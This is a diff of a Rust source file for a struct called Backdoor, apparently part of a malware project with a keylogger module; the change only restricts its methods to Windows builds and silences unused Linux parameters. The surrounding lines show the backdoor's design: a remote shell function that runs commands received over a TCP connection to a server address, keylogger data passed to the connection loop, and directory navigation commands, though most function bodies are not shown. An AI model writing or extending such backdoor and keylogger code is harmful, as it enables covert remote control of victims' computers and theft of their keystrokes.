@@ -1,7 +1,9 @@
+#[cfg(target_os = "windows")]
 use std::{net::{TcpStream, Shutdown}, thread, io::{Read, Write}, path::Path, env};
 use std::sync::{Arc, Mutex};
 
 use flealib::keylogger::Keylogger;
+#[cfg(target_os = "windows")]
 use log::debug;
 
 pub struct Backdoor
@@ -20,6 +22,7 @@ impl Backdoor
     /// Change a directory to one level up
     /// # Returns
     /// * `Result<(), String>` - Result of the operation
+    #[cfg(target_os = "windows")]
     pub fn change_directory_up(&self) -> Result<(), String>
     {
         let binding = env::current_dir().unwrap();
@@ -44,6 +47,7 @@ impl Backdoor
     /// * 'folder' - New directory
     /// # Returns
     /// * `Result<(), String>` - Result of the operation
+    #[cfg(target_os = "windows")]
     pub fn change_directory(&self, folder: &str) -> Result<(), String>
     {
         match std::env::set_current_dir(folder)
@@ -66,6 +70,7 @@ impl Backdoor
     /// The result of the command
     /// # Safety
     /// This function is unsafe because it calls an external function
+    #[cfg(target_os = "windows")]
     fn shell(&self, buffer: &String) -> String
     {
         use std::ffi::{c_char, CStr, CString};
@@ -121,6 +126,7 @@ impl Backdoor
     /// # Returns
     /// True if the user sent a special command to close the program
     /// False if the user did not send a special command to close the program
+    #[cfg(target_os = "windows")]
     fn run_special_cmd(&self, cmd: &String) -> bool
     {
         let mut quit = false;
@@ -138,6 +144,7 @@ impl Backdoor
     /// # Arguments
     /// * `stream` - The TcpStream object
     /// * `key_logger_data` - The keylogger data
+    #[cfg(target_os = "windows")]
     fn process(&self, mut stream: TcpStream, key_logger_data: &Arc<Mutex<Keylogger>>) -> bool
     {
         const MAX_INPUT_BUFFER: usize = 1024;
@@ -233,6 +240,7 @@ impl Backdoor
     /// # Arguments
     /// * `address` - The address of the server
     /// * `key_logger_data` - The keylogger data
+    #[cfg(target_os = "windows")]
     pub fn run(&self, address: &str, key_logger_data: Arc<Mutex<Keylogger>>)
     {
         const NEXT_CONNECTION_WAIT_TIME: u64 = 2000;
@@ -268,7 +276,7 @@ impl Backdoor
 
     /// Currently there is no implementation for linux
     #[cfg(target_os = "linux")]
-    pub fn run(&self, address: &str, key_logger_data: Arc<Mutex<Keylogger>>)
+    pub fn run(&self, _address: &str, _key_logger_data: Arc<Mutex<Keylogger>>)
     {        
     }
 }
